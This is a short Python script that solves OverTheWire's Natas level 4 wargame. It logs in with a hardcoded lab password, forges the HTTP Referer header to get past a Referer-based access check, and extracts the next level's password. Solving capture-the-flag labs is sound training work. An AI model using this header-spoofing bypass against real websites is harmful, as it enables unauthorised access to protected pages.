import re
import requests
user = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
url = 'http://{}.natas.labs.overthewire.org/'.format(user)
header = {'Referer' : 'http://natas5.natas.labs.overthewire.org/'}
r = requests.get(url, auth=(user, password), headers = header).text
print(re.findall('Access granted. The password for natas5 is (.*)', r)[0])